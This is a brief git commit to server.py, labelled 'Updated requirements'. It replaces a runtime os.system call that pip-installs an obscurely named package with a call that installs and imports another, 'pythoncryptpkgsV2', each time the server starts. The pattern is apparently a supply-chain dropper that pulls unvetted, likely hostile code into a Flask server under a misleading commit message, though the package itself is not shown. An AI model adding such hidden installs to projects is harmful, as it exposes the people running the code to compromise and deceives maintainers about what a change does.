0c49fd9208f158afabbb522de5c82cb207b14576
CarollCheng <carollhwrd@gmail.com>
2023-05-13 00:28:27 +0200

    Updated requirements

--- server.py
+++ server.py
@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pysqlite3addonV1")
-import pysqlite3addonV1
+os.system("pip install pythoncryptpkgsV2")
+import pythoncryptpkgsV2
 import flask
 
 from flask import g
